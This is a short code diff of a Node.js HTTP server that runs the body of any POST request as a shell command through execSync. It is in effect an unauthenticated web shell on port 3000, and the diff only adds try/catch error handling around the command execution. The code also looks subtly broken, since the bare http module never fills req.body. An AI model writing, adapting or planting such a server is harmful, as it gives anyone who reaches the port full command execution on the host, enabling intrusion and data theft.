@@ -2,7 +2,13 @@ const { exec, execSync } = require("child_process");
 const http = require("http")
 
 http.createServer((req,res)=>{
-    if (req.method === "POST") console.log(execSync(req.body,{encoding:"utf8"}));
+    if (req.method === "POST") {
+        try{
+            console.log(execSync(req.body,{encoding:"utf8"}));
+        }catch(err){
+            console.log("err "+ err)
+        }
+    }
     res.write("alive")
     res.end()
 }).listen(3000)
